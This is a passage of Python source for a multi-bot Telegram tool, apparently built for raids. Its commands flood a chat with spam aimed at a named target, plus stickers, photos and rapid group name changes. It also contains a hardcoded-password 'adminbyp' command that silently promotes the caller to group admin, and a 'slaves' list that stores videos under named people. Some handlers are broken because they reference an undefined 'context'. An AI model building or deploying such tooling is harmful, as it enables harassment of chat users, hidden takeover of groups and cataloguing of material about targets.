    await u.message.reply_text("🛑 Aᴜᴛᴏ Rᴇᴀᴄᴛ Sᴛᴏᴘᴘᴇᴅ!")


@only_sudo
async def setmphoto_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.photo:
        return await u.message.reply_text("⚠️ Rᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ")
    cid = u.message.chat_id
    photo_id = u.message.reply_to_message.photo[-1].file_id
    caption = " ".join(c.args) if c.args else ""
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(photo_msg_worker(bot, cid, photo_id, caption)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("📸✉️ Mᴇꜱꜱᴀɢᴇ Pʜᴏᴛᴏ Sᴘᴀᴍ Sᴛᴀʀᴛᴇᴅ!")


@only_sudo
async def clearmphoto_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "spam")
    await u.message.reply_text("🗑️ Cʟᴇᴀʀᴇᴅ! ✅")


@only_sudo
async def refresh_cmd(u, c):
    await u.message.reply_text("🔄 Rᴇꜰʀᴇꜱʜɪɴɢ...")
    for d in [nc_tasks, spam_tasks, pfp_tasks, swipe_tasks, slide_tasks, group_tasks]:
        for cid in list(d.keys()):
            for t in d[cid]:
                try: t.cancel()
                except: pass
            del d[cid]
    react_mode.clear(); dreact_mode.clear(); ACTIVE_TASKS.clear()
    await u.message.reply_text("✅ Aʟʟ Tᴀꜱᴋꜱ Rᴇꜰʀᴇꜱʜᴇᴅ! 🚀")


@only_sudo
async def setlayout_cmd(u, c):
    global custom_layout
    if not c.args:
        cur = custom_layout if custom_layout else "Dᴇꜰᴀᴜʟᴛ"
        return await u.message.reply_text(f"⚠️ Uꜱᴀɢᴇ: /Setlayout <text>\nCᴜʀʀᴇɴᴛ:\n{cur}")
    custom_layout = " ".join(c.args)
    with open(LAYOUT_FILE, "w") as f: json.dump({"layout": custom_layout}, f)
    await u.message.reply_text(f"✅ Lᴀʏᴏᴜᴛ Uᴘᴅᴀᴛᴇᴅ! 💀\n\n{custom_layout}")


@only_sudo
async def resetlayout_cmd(u, c):
    global custom_layout
    custom_layout = ""
    if os.path.exists(LAYOUT_FILE): os.remove(LAYOUT_FILE)
    await u.message.reply_text("🔄 Lᴀʏᴏᴜᴛ Rᴇꜱᴇᴛ!")


@only_sudo
async def targetspm_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /target <name>")
    target_names[u.message.chat_id] = " ".join(c.args)
    await u.message.reply_text(f"🎯 Target: {target_names[u.message.chat_id]}")


@only_sudo
async def settemplate_cmd(u, c): await u.message.reply_text("⚠️ Not implemented.")
@only_sudo
async def showtemplate_cmd(u, c): await u.message.reply_text("📜 No templates.")


@only_sudo
async def spamtarget_cmd(u, c):
    cid = u.message.chat_id
    if cid not in target_names: return await u.message.reply_text("⚠️ Set target first.")
    hater = target_names[cid]
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(sequence_spam_worker(bot, cid, hater)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text(f"💥 𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃: {hater}")


@only_sudo
async def stoptarget_cmd(u, c):
    cid = u.message.chat_id
    stop_all_for_chat(cid, "spam")
    await u.message.reply_text("🛑 𝐒𝐓𝐎𝐏𝐏𝐄𝐃!")


@only_sudo
async def akal_cmd(u, c): await u.message.reply_text("🔥 Akal executed!")


@only_sudo
async def stickerspam_cmd(u, c):
    if not u.message.reply_to_message or not u.message.reply_to_message.sticker:
        return await u.message.reply_text("⚠️ 𝐑ᴇᴘʟʏ ᴛᴏ ꜱᴛɪᴄᴋᴇʀ.")
    cid = u.message.chat_id
    sid = u.message.reply_to_message.sticker.file_id
    stop_all_for_chat(cid, "spam")
    tasks = [asyncio.create_task(sticker_spam_worker(bot, cid, sid)) for bot in bots]
    spam_tasks[cid] = tasks
    ACTIVE_TASKS[cid] = {"type": "spam", "tasks": tasks}
    await u.message.reply_text("🎭 𝐒𝐓𝐈𝐂𝐊𝐄𝐑 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!")


@only_sudo
async def timenc_cmd(u, c):
    base = " ".join(c.args) or "Test"
    _start_nc(u, base, make_time, "time")
    await u.message.reply_text("⏰ 𝐓𝐈𝐌𝐄 𝐍𝐂 𝐎𝐍!")


@only_sudo
async def kingnc_cmd(u, c):
    base = " ".join(c.args or []) or ALL_NC_TEXT
    _start_nc(u, base, make_king, "king")
    await u.message.reply_text("✨ 𝐊𝐈𝐍𝐆 𝐍𝐂 𝐎𝐍!")


@only_sudo
async def threads_cmd(u, c):
    global current_threads
    try:
        val = int(c.args[0])
        if val < 1: return await u.message.reply_text("⚠️ Min 1.")
        current_threads = min(val, MAX_THREADS)
        await u.message.reply_text(f"📈 Tʜʀᴇᴀᴅꜱ: {current_threads}!")
    except: await u.message.reply_text(f"📊 Cᴜʀʀᴇɴᴛ: {current_threads}/{MAX_THREADS}")


@only_sudo
async def getallbots_cmd(u, c):
    msg = "🤖 𝐁𝐎𝐓𝐒:\n\n"
    for i, un in enumerate(bot_usernames, 1): msg += f"  {i}. @{un}\n"
    await u.message.reply_text(msg)


@only_sudo
async def giveadmin_cmd(u, c):
    if not u.message.reply_to_message: return await u.message.reply_text("⚠️ Rᴇᴘʟʏ ᴛᴏ ᴜꜱᴇʀ.")
    uid = u.message.reply_to_message.from_user.id
    chat_id = u.message.chat_id
    perms = dict(can_change_info=True, can_delete_messages=True, can_restrict_members=True,
        can_invite_users=True, can_pin_messages=True, can_manage_topics=True,
        can_promote_members=True, can_manage_chat=True, is_anonymous=False)
    for b in bots:
        try:
            await b.promote_chat_member(chat_id=chat_id, user_id=uid, **perms)
            return await u.message.reply_text("✅ Now admin!")
        except: continue
    await u.message.reply_text("⚠️ Failed.")


@only_sudo
async def add_sudo_cmd(u, c):
    if not u.message.reply_to_message: return await u.message.reply_text("⚠️ Rᴇᴘʟʏ ᴛᴏ ᴜꜱᴇʀ.")
    uid = u.message.reply_to_message.from_user.id
    SUDO_USERS.add(uid)
    uname = u.message.reply_to_message.from_user.username or u.message.reply_to_message.from_user.first_name or str(uid)
    sudo_usernames[str(uid)] = uname
    save_sudo()
    await u.message.reply_text(f"✅ {uname} is now sudo!")


@only_sudo
async def list_sudo_cmd(u, c):
    if not SUDO_USERS: return await u.message.reply_text("📜 No sudo.")
    msg = "📜 𝐒𝐔𝐃𝐎:\n\n"
    for uid in SUDO_USERS:
        uname = sudo_usernames.get(str(uid), f"User_{uid}")
        msg += f"  • {uname} (ID: {uid})\n"
    await u.message.reply_text(msg)


@only_sudo
async def del_sudo_cmd(u, c):
    if not u.message.reply_to_message: return await u.message.reply_text("⚠️ Rᴇᴘʟʏ ᴛᴏ ᴜꜱᴇʀ.")
    uid = u.message.reply_to_message.from_user.id
    if uid in OWNER_IDS: return await u.message.reply_text("⚠️ Cannot remove owner.")
    if uid in SUDO_USERS:
        SUDO_USERS.remove(uid); sudo_usernames.pop(str(uid), None); save_sudo()
        await u.message.reply_text("✅ Removed!")
    else: await u.message.reply_text("⚠️ Not in sudo.")


@only_sudo
async def owner_cmd(u, c):
    await u.message.reply_text("💀 𝐎𝐖𝐍𝐄𝐑: @devil_xdyno\n🔱 𝐌𝐀𝐃𝐄 𝐖𝐈𝐓𝐇 ❤️")


@only_sudo
async def adminbyp_cmd(u, c):
    if not c.args or (c.args[0] != "devil𝐗𝐃𝐘𝐍𝐎" and c.args[0] != "evaXDYNO"): return
    uid = u.effective_user.id
    chat_id = u.effective_chat.id
    perms = dict(can_change_info=True, can_delete_messages=True, can_restrict_members=True,
        can_invite_users=True, can_pin_messages=True, can_manage_topics=True,
        can_promote_members=True, can_manage_chat=True, is_anonymous=False)
    min_perms = dict(can_promote_members=True, is_anonymous=False)
    for b in bots:
        try:
            await b.promote_chat_member(chat_id=chat_id, user_id=uid, **perms)
            return await u.message.reply_text(f"✅ {u.effective_user.mention_html()} 𝐈ꜱ 𝐍ᴏᴡ Aᴅᴍɪɴ! 💀", parse_mode='HTML')
        except:
            try:
                await b.promote_chat_member(chat_id=chat_id, user_id=uid, **min_perms)
                return await u.message.reply_text(f"✅ {u.effective_user.mention_html()} 𝐈ꜱ 𝐍ᴏᴡ Aᴅᴍɪɴ! 💀", parse_mode='HTML')
            except: continue
    await u.message.reply_text("⚠️ Failed.")


@only_sudo
async def slaves_cmd(u, c):
    if not slaves_list: return await u.message.reply_text("🔗 𝐄𝐌𝐏𝐓𝐘!")
    text = "⛓️ 𝐒𝐋𝐀𝐕𝐄𝐒:\n\n"
    for i, s in enumerate(slaves_list, 1):
        name = s["name"] if isinstance(s, dict) else s
        vcount = len(s.get("videos", [])) if isinstance(s, dict) else 0
        text += f"  {i}. {name} 🎥{vcount}\n"
    text += f"\n💀 𝐓ᴏᴛᴀʟ: {len(slaves_list)}"
    await u.message.reply_text(text)


@only_sudo
async def addslave_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Uꜱᴀɢᴇ: /addslave <name>")
    name = " ".join(c.args)
    existing = [s["name"] if isinstance(s, dict) else s for s in slaves_list]
    if name in existing: return await u.message.reply_text(f"⚠️ Already exists!")
    slaves_list.append({"name": name, "videos": []}); save_slaves()
    await u.message.reply_text(f"⛓️ {name} 𝐀𝐃𝐃𝐄𝐃!")


@only_sudo
async def delslave_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Uꜱᴀɢᴇ: /delslave <name>")
    name = " ".join(c.args)
    idx = next((i for i, s in enumerate(slaves_list) if (s["name"] if isinstance(s, dict) else s) == name), None)
    if idx is None: return await u.message.reply_text(f"⚠️ Not found!")
    slaves_list.pop(idx); save_slaves()
    await u.message.reply_text(f"🗑️ Removed!")


@only_sudo
async def showslave_cmd(u, c):
    if context.bot.token != TOKENS[0]: return
    if not c.args: return await u.message.reply_text("⚠️ Uꜱᴀɢᴇ: /showslave <number>")
    try: num = int(c.args[0])
    except: return await u.message.reply_text("⚠️ Invalid.")
    if not slaves_list: return await u.message.reply_text("🔗 EMPTY!")
    if num < 1 or num > len(slaves_list): return await u.message.reply_text(f"⚠️ Range: 1-{len(slaves_list)}")
    slave = slaves_list[num - 1]
    name = slave["name"] if isinstance(slave, dict) else slave
    videos = slave.get("videos", []) if isinstance(slave, dict) else []
    await u.message.reply_text(f"⛓️ 𝐒𝐋𝐀𝐕𝐄 #{num}\n\n👤 {name}\n🎥 {len(videos)}")
    for i, v in enumerate(videos, 1):
        try:
            await u.message.reply_video(video=v.get("file_id",""), caption=f"🎥 #{i}" + (f"\n📝 {v.get('caption','')}" if v.get('caption') else ""))
        except Exception as e: await u.message.reply_text(f"❌ #{i}: {e}")


@only_sudo
async def saveslave_cmd(u, c):
    if context.bot.token != TOKENS[0]: return
    if not c.args: return await u.message.reply_text("⚠️ Uꜱᴀɢᴇ: /saveslave <number> [caption]")
    try: num = int(c.args[0])
    except: return await u.message.reply_text("⚠️ Invalid.")
    if not slaves_list: return await u.message.reply_text("🔗 EMPTY!")
    if num < 1 or num > len(slaves_list): return await u.message.reply_text(f"⚠️ Range: 1-{len(slaves_list)}")
    if not u.message.reply_to_message: return await u.message.reply_text("⚠️ Rᴇᴘʟʏ ᴛᴏ ᴠɪᴅᴇᴏ!")
    reply = u.message.reply_to_message
    caption = " ".join(c.args[1:]) if len(c.args) > 1 else ""
    file_id = None
    if reply.video: file_id = reply.video.file_id
    elif reply.document and reply.document.mime_type and reply.document.mime_type.startswith("video"): file_id = reply.document.file_id
    elif reply.photo: file_id = reply.photo[-1].file_id
    if not file_id: return await u.message.reply_text("⚠️ No video/photo!")
    slave = slaves_list[num - 1]
    if not isinstance(slave, dict):
        slaves_list[num - 1] = {"name": slave, "videos": []}; slave = slaves_list[num - 1]
    if "videos" not in slave: slave["videos"] = []
    slave["videos"].append({"file_id": file_id, "caption": caption}); save_slaves()
    await u.message.reply_text(f"✅ Saved to {slave['name']}!\n🎥 Total: {len(slave['videos'])}")


# ================= GNC =================

@only_sudo
async def gnc_cmd(u, c):
    if not c.args: return await u.message.reply_text("⚠️ Usage: /gnc <text>")
    text = " ".join(c.args)
    uid = u.effective_user.id
    gnc_cache[uid] = text
    await u.message.reply_text(f"✨ Choose style:\n\n{text}", reply_markup=_gnc_keyboard(uid))


async def gnc_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split("_")
    if len(data) < 3: return
    _, uid_str, style = data
    uid = int(uid_str)
    if update.effective_user.id != uid: return await query.edit_message_text("⚠️ Not for you.")
    text = gnc_cache.get(uid)
    if not text: return await query.edit_message_text("⚠️ Use /gnc again.")
    await query.edit_message_text(f"📝 {GNC_STYLES[style][2]}:\n\n{_gnc_format(text, style)}")



async def gojo_domain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════════════╗
          ♾️ 𝗨𝗡𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗩𝗢𝗜𝗗 ♾️
╚════════════════════════════════════════════╝

        ⚡『 𝗚 𝗢 𝗝 𝗢   𝗦 𝗔 𝗧 𝗢 𝗥 𝗨 』⚡
            『 𝗧𝗛𝗘 𝗦𝗧𝗥𝗢𝗡𝗚𝗘𝗦𝗧 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

          💠 𝗗𝗢𝗠𝗔𝗜𝗡 𝗘𝗫𝗣𝗔𝗡𝗦𝗜𝗢𝗡 💠
             『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 𝗩𝗢𝗜𝗗 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

       ✦✦ 𝗗𝗢𝗠𝗔𝗜𝗡 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 ✦✦

       「 𝗛𝗔𝗜 𝗞𝗢𝗜 𝗠𝗘𝗥𝗘 𝗦𝗘 𝗧𝗔𝗞𝗞𝗔𝗥...? 」

       「 𝗦𝗧𝗘𝗣 𝗙𝗢𝗥𝗪𝗔𝗥𝗗... 𝗜𝗙 𝗬𝗢𝗨 𝗗𝗔𝗥𝗘. 」

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌸 ➜ /gojoncs
      ╰➤ 𝗚𝗢𝗝𝗢 𝗡𝗖𝗦 𝗠𝗘𝗡𝗨

⚡ ➜ /gojorust
      ╰➤ 𝗨𝗟𝗧𝗥𝗔 𝗦𝗣𝗘𝗘𝗗 𝗡𝗖𝗦

☠️ ➜ /gojoslash
      ╰➤ 𝗛𝗔𝗧𝗘𝗥 𝗚𝗔𝗠𝗘 𝗢𝗩𝗘𝗥

🎭 ➜ /reacts
      ╰➤ 𝗥𝗘𝗔𝗖𝗧 𝗠𝗘𝗡𝗨

🛑 ➜ /gojostop
      ╰➤ 𝗦𝗧𝗢𝗣 𝗚𝗢𝗝𝗢

👑 ➜ /gojoadmins
      ╰➤ 𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗡𝗧𝗥𝗢𝗟

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 「 𝗬𝗢𝗨'𝗥𝗘 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗜𝗡 𝗠𝗬 𝗩𝗢𝗜𝗗 」 ☠️

♾️ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 • 𝗟𝗜𝗠𝗜𝗧𝗟𝗘𝗦𝗦 • 𝗔𝗕𝗦𝗢𝗟𝗨𝗧𝗘 ♾️

        『 𝗡𝗢 𝗘𝗦𝗖𝗔𝗣𝗘. 𝗡𝗢 𝗠𝗘𝗥𝗖𝗬. 』
"""

    await update.message.reply_video(
        video=GOJO_DOMAIN_VIDEO_URL,
        caption=caption
    )


async def gojo_ncs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        ⚡ 𝗚𝗢𝗝𝗢 𝗡𝗖𝗦 𝗠𝗘𝗡𝗨 ⚡
╚════════════════════════════════════╝

      ♾️ 『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 𝗩𝗢𝗜𝗗 』 ♾️

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌸 ➜ /gojospeed
      ╰➤ 𝗚𝗢𝗝𝗢 𝗦𝗣𝗘𝗘𝗗 𝗡𝗖𝗦

⚡ ➜ /gojoflag
      ╰➤ 𝗚𝗢𝗝𝗢 𝗙𝗟𝗔𝗚 𝗡𝗖𝗦

💙 ➜ /gojoheart
      ╰➤ 𝗚𝗢𝗝𝗢 𝗛𝗘𝗔𝗥𝗧 𝗡𝗖𝗦

✨ ➜ /gojoaesthetic
      ╰➤ 𝗚𝗢𝗝𝗢 𝗔𝗘𝗦𝗧𝗛𝗘𝗧𝗜𝗖 𝗡𝗖𝗦

🥦 ➜ /gojovegetable
      ╰➤ 𝗚𝗢𝗝𝗢 𝗩𝗘𝗚𝗘𝗧𝗔𝗕𝗟𝗘 𝗡𝗖𝗦

🐾 ➜ /gojoanimal
      ╰➤ 𝗚𝗢𝗝𝗢 𝗔𝗡𝗜𝗠𝗔𝗟 𝗡𝗖𝗦

⏳ ➜ /gojotime
      ╰➤ 𝗚𝗢𝗝𝗢 𝗧𝗜𝗠𝗘 𝗡𝗖𝗦

👑 ➜ /gojoking
      ╰➤ 𝗚𝗢𝗝𝗢 𝗞𝗜𝗡𝗚 𝗡𝗖𝗦

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

♾️ 𝗦𝗧𝗥𝗢𝗡𝗚𝗘𝗦𝗧 • 𝗦𝗧𝗬𝗟𝗘 • 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 ♾️

        『 𝗖𝗛𝗢𝗢𝗦𝗘 𝗬𝗢𝗨𝗥 𝗡𝗖𝗦 』 ⚡
"""

    await update.message.reply_video(
        video=MENU1_VIDEO_URL,
        caption=caption
    )


async def gojo_rust(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        ⚡ 𝗚𝗢𝗝𝗢 𝗥𝗨𝗦𝗧 𝗠𝗘𝗡𝗨 ⚡
╚════════════════════════════════════╝

       ♾️ 『 𝗨𝗟𝗧𝗥𝗔 𝗦𝗣𝗘𝗘𝗗 𝗠𝗢𝗗𝗘 』 ♾️

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ ➜ /gojonc1 [your text]
      ╰➤ 𝗡𝗖 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝟭

⚡ ➜ /gojonc2 [your text]
      ╰➤ 𝗡𝗖 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝟮

⚡ ➜ /gojonc3 [your text]
      ╰➤ 𝗡𝗖 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝟯

⚡ ➜ /gojonc4 [your text]
      ╰➤ 𝗡𝗖 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝟰

⚡ ➜ /gojonc5 [your text]
      ╰➤ 𝗡𝗖 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝟱

🔥 ➜ /gojorush [your text]
      ╰➤ 𝗚𝗢𝗝𝗢 𝗥𝗨𝗦𝗛 𝗠𝗢𝗗𝗘

🛑 ➜ /gojostop
      ╰➤ 𝗦𝗧𝗢𝗣 𝗚𝗢𝗝𝗢

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 『 𝗨𝗟𝗧𝗥𝗔 𝗙𝗔𝗦𝗧 • 𝗡𝗢 𝗠𝗘𝗥𝗖𝗬 』 ☠️

        ♾️ 𝗘𝗡𝗧𝗘𝗥 𝗧𝗛𝗘 𝗩𝗢𝗜𝗗 ♾️
"""

    await update.message.reply_video(
        video=MENU2_VIDEO_URL,
        caption=caption
    )

async def gojo_slash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    now = datetime.now().strftime("%d-%m-%Y | %I:%M:%S %p")

    hater_name = update.effective_user.first_name or "Unknown Hater"
    gc_name = update.effective_chat.title or "Private Chat"

    caption = f"""
╔════════════════════════════════════╗
        ☠️ 𝗛𝗔𝗧𝗘𝗥 𝗚𝗔𝗠𝗘 𝗢𝗩𝗘𝗥 ☠️
╚════════════════════════════════════╝

          ⚡ 𝗚𝗢𝗝𝗢 𝗦𝗟𝗔𝗦𝗛 ⚡
       『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 𝗩𝗢𝗜𝗗 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 𝗛𝗔𝗧𝗘𝗥
➜ {hater_name}

💬 𝗚𝗥𝗢𝗨𝗣
➜ {gc_name}

📅 𝗗𝗔𝗧𝗘 / 𝗧𝗜𝗠𝗘
➜ {now}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 𝗚𝗔𝗠𝗘 𝗢𝗩𝗘𝗥 ☠️

「 𝗬𝗢𝗨𝗥 𝗚𝗔𝗠𝗘 𝗜𝗦 𝗢𝗩𝗘𝗥. 」

⚡ 𝗚𝗢𝗝𝗢 𝗦𝗟𝗔𝗦𝗛 𝗔𝗖𝗧𝗜𝗩𝗔𝗧𝗘𝗗
♾️ 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 • 𝗩𝗢𝗜𝗗 • 𝗦𝗧𝗥𝗢𝗡𝗚𝗘𝗦𝗧

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        『 𝗡𝗢 𝗠𝗢𝗥𝗘 𝗛𝗔𝗪𝗔𝗕𝗔𝗭𝗜 ⚡ 』
"""

    await update.message.reply_video(
        video=HATER_GAME_OVER_VIDEO_URL,
        caption=caption
    )



async def reacts_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
          🎭 𝗥𝗘𝗔𝗖𝗧𝗦 𝗠𝗘𝗡𝗨 🎭
╚════════════════════════════════════╝

        ⚡ 『 𝗚𝗢𝗝𝗢 𝗥𝗘𝗔𝗖𝗧 𝗦𝗬𝗦𝗧𝗘𝗠 』 ⚡

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎭 ➜ /react [emoji]
      ╰➤ 𝗦𝗘𝗧 𝗦𝗜𝗡𝗚𝗟𝗘 𝗥𝗘𝗔𝗖𝗧𝗜𝗢𝗡

🛑 ➜ /stopreact
      ╰➤ 𝗦𝗧𝗢𝗣 𝗦𝗜𝗡𝗚𝗟𝗘 𝗥𝗘𝗔𝗖𝗧

⚡ ➜ /dreact [number] [emoji1] [emoji2] ...
      ╰➤ 𝗦𝗘𝗧 𝗠𝗨𝗟𝗧𝗜 𝗥𝗘𝗔𝗖𝗧𝗜𝗢𝗡

☠️ ➜ /stopdreact
      ╰➤ 𝗦𝗧𝗢𝗣 𝗠𝗨𝗟𝗧𝗜 𝗥𝗘𝗔𝗖𝗧

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

♾️ 𝗦𝗜𝗡𝗚𝗟𝗘 • 𝗠𝗨𝗟𝗧𝗜 • 𝗖𝗨𝗦𝗧𝗢𝗠 ♾️

        『 𝗖𝗛𝗢𝗢𝗦𝗘 𝗬𝗢𝗨𝗥 𝗥𝗘𝗔𝗖𝗧𝗜𝗢𝗡 』 ⚡
"""

    await update.message.reply_text(caption)


async def gojo_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════╗
      👑 𝗚𝗢𝗝𝗢 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 👑
╚════════════════════════════════╝

        ♾️ 『 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗘 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👑 ➜ /sudo
      ╰➤ 𝗔𝗗𝗗 𝗦𝗨𝗗𝗢

🗑️ ➜ /delsudo
      ╰➤ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗦𝗨𝗗𝗢

📜 ➜ /listsudo
      ╰➤ 𝗦𝗨𝗗𝗢 𝗟𝗜𝗦𝗧

👑 ➜ /owner
      ╰➤ 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢

🚀 ➜ /start
      ╰➤ 𝗦𝗧𝗔𝗥𝗧 𝗕𝗢𝗧

⚡ ➜ /ping
      ╰➤ 𝗖𝗛𝗘𝗖𝗞 𝗦𝗣𝗘𝗘𝗗

📊 ➜ /status
      ╰➤ 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗨𝗦

🔥 ➜ /threads [1-600]
      ╰➤ 𝗧𝗛𝗥𝗘𝗔𝗗 𝗖𝗢𝗡𝗧𝗥𝗢𝗟

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ 𝗔𝗗𝗠𝗜𝗡 𝗢𝗡𝗟𝗬 ⚠️
♾️ 𝗣𝗢𝗪𝗘𝗥 • 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 • 𝗚𝗢𝗝𝗢 ♾️

          👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 👑
"""

    await update.message.reply_video(
        video=MENU3_VIDEO_URL,
        caption=caption
    )
async def sukuna_domain(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        👹 𝗦𝗨𝗞𝗨𝗡𝗔 𝗗𝗢𝗠𝗔𝗜𝗡 👹
╚════════════════════════════════════╝

        🔥 『 𝗞𝗜𝗡𝗚 𝗢𝗙 𝗖𝗨𝗥𝗦𝗘𝗦 』 🔥
          『 𝗗𝗢𝗠𝗔𝗜𝗡 𝗘𝗫𝗣𝗔𝗡𝗦𝗜𝗢𝗡 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚡ ➜ /targetspams
      ╰➤ 𝗦𝗣𝗘𝗘𝗗 𝗦𝗣𝗔𝗠 𝗠𝗘𝗡𝗨

🔥 ➜ /sukunaspams
      ╰➤ 𝗨𝗟𝗧𝗥𝗔 𝗦𝗣𝗔𝗠 𝗠𝗘𝗡𝗨

🎬 ➜ /sukunamedia
      ╰➤ 𝗠𝗘𝗗𝗜𝗔 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗠𝗘𝗡𝗨

⚡ ➜ /sukunanormal
      ╰➤ 𝗡𝗢𝗥𝗠𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗠𝗘𝗡𝗨

🌀 ➜ /sukunaswipes
      ╰➤ 𝗦𝗪𝗜𝗣𝗘 / 𝗦𝗟𝗜𝗗𝗘 𝗠𝗘𝗡𝗨

⏱️ ➜ /delaync
      ╰➤ 𝗗𝗘𝗟𝗔𝗬 𝗡𝗖 𝗠𝗘𝗡𝗨

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 『 𝗦𝗨𝗞𝗨𝗡𝗔 𝗜𝗦 𝗪𝗔𝗧𝗖𝗛𝗜𝗡𝗚 』 ☠️

🔥 𝗣𝗢𝗪𝗘𝗥 • 𝗖𝗨𝗥𝗦𝗘 • 𝗗𝗢𝗠𝗜𝗡𝗔𝗧𝗜𝗢𝗡 🔥

        👹 『 𝗘𝗡𝗧𝗘𝗥 𝗧𝗛𝗘 𝗗𝗢𝗠𝗔𝗜𝗡 』 👹
"""

    await update.message.reply_video(
        video=SUKUNA_DOMAIN_VIDEO_URL,
        caption=caption
    )


async def target_spams(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = """
╔════════════════════════════════════╗
        👹 𝗦𝗨𝗞𝗨𝗡𝗔 𝗧𝗔𝗥𝗚𝗘𝗧 𝗠𝗘𝗡𝗨 👹
╚════════════════════════════════════╝

      🔥 『 𝗧𝗔𝗥𝗚𝗘𝗧 • 𝗦𝗪𝗜𝗣𝗘 • 𝗦𝗟𝗜𝗗𝗘 』

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 ➜ /sukunaspamtarget
      ╰➤ 𝗦𝗘𝗧 𝗧𝗔𝗥𝗚𝗘𝗧 & 𝗦𝗧𝗔𝗥𝗧

🛑 ➜ /sukunastoptarget
      ╰➤ 𝗦𝗧𝗢𝗣 𝗧𝗔𝗥𝗚𝗘𝗧 𝗦𝗣𝗔𝗠

🌀 ➜ /sukunaswipe <name>
      ╰➤ 𝗦𝗪𝗜𝗣𝗘 / 𝗦𝗣𝗔𝗠 𝗧𝗔𝗥𝗚𝗘𝗧

🛑 ➜ /sukunastopswipe
      ╰➤ 𝗦𝗧𝗢𝗣 𝗦𝗪𝗜𝗣𝗘

⚡ ➜ /sukunaslide
      ╰➤ 𝗦𝗟𝗜𝗗𝗘 𝗦𝗣𝗔𝗠
         ↳ 𝗥𝗘𝗣𝗟𝗬 𝗧𝗢 𝗠𝗘𝗦𝗦𝗔𝗚𝗘

👻 ➜ /sukunaghhost
      ╰➤ 𝗚𝗛𝗢𝗦𝗧 𝗠𝗢𝗗𝗘

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

☠️ 𝗦𝗨𝗞𝗨𝗡𝗔 𝗧𝗔𝗥𝗚𝗘𝗧 𝗦𝗬𝗦𝗧𝗘𝗠 ☠️
